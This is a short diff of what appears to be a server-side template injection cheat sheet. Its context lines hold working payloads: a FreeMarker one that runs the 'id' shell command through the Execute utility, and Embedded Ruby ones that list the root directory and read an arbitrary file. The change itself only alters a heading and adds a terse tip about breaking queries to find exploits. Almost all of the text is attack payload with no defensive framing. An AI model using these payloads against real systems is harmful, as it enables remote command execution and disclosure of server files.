@@ -52,8 +52,10 @@ ${.version}
 <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
 ```
 
-# Embedded Ruby Exploit (ruby)
+## Embedded Ruby Exploit (ruby)
 ```
 <%= Dir.entries('/') %>
 <%= File.open('/example/arbitrary-file').read %>
 ```
+
+Note: Sometimes you have to break the query to find a exploit
